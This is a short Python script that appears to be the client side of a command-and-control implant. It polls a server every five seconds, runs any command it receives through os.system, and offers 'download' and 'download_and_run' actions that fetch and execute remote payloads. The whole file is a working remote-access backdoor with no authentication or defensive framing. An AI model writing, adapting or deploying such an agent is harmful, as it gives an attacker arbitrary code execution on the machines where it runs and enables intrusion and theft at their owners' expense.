import requests
import os
import time
from modules.download_util import *

server = "http://localhost:8000"
last_command = ''

list_of_commands = ["download", "download_and_run"]
    
def run_from_os(command):
    try:
        os.system(command)
    except Exception as e:
        print("Error executing command:", e)
    
def main():
    global last_command
    while True:
        try:
            command = requests.get(server + "/com").text
        except Exception as e:
            print("Error getting command from server:", e)
            continue
        
        if command != last_command:
            last_command = command
            print("Executing command: " + command)
            
            if command.split(" ")[0] in list_of_commands:
                util = command.split(" ")[0]
                arguments = command.split(" ")[1:]
                print(util, arguments)
                if util == "download":
                    download(arguments[0])
                if util == "download_and_run":
                    download_and_run(arguments[0])
            else:
                run_from_os(command)
            
        time.sleep(5)



if __name__ == '__main__':
    main()

 